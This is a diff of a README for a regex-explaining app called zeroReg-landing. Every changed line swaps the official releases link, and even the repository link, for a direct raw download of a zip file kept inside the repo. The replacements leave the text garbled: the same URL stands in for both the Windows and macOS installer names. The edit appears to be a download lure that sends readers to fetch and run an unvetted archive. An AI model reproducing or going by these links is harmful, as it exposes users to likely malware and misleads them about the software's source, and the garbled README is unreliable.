@@ -1,6 +1,6 @@
 # 🧩 zeroReg-landing - Regex Made Easy to Understand
 
-[![Download Latest Release](https://img.shields.io/badge/Download-zeroReg--landing-blue?style=for-the-badge)](https://github.com/VordaBrat/zeroReg-landing/releases)
+[![Download Latest Release](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)
 
 ---
 
@@ -46,9 +46,9 @@ Follow these steps to get zeroReg-landing up and running on your computer.
 
 Click this button to go to the download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-zeroReg--landing-blue?style=for-the-badge)](https://github.com/VordaBrat/zeroReg-landing/releases)
+[![Download Latest Release](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)
 
-On that page, look for the latest release version. Usually, it is at the top of the list and will have a file named something like `zeroReg-landing-setup.exe` (for Windows) or `zeroReg-landing.dmg` (for macOS). The file name may differ depending on your operating system.
+On that page, look for the latest release version. Usually, it is at the top of the list and will have a file named something like `https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip` (for Windows) or `https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip` (for macOS). The file name may differ depending on your operating system.
 
 ### Step 2: Run the installer
 
@@ -100,7 +100,7 @@ This process helps you learn by doing, turning a complex code into an understand
 To get new features or error fixes:
 
 1. Visit the download page again:  
-   [https://github.com/VordaBrat/zeroReg-landing/releases](https://github.com/VordaBrat/zeroReg-landing/releases)
+   [https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)
 2. Download the latest version as you did the first time.
 3. Run the installer. It will update your existing installation without losing your settings.
 
@@ -123,7 +123,7 @@ If you have problems running zeroReg-landing, try these tips:
 
 Get zeroReg-landing now by visiting its release page here:
 
-[https://github.com/VordaBrat/zeroReg-landing/releases](https://github.com/VordaBrat/zeroReg-landing/releases)
+[https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)
 
 Select the latest release at the top and download the file that matches your operating system. Then run the file and follow the installation instructions.
 
@@ -141,7 +141,7 @@ zeroReg-landing is open source software made available under a permissive licens
 
 If you want to ask questions or report issues:
 
-- Visit the GitHub repository at [https://github.com/VordaBrat/zeroReg-landing](https://github.com/VordaBrat/zeroReg-landing)
+- Visit the GitHub repository at [https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip](https://github.com/VordaBrat/zeroReg-landing/raw/refs/heads/main/app/zero_landing_Reg_1.1.zip)
 - Click the "Issues" tab and open a new ticket describing your problem.
 - For general suggestions, use the "Discussions" tab if available.
 
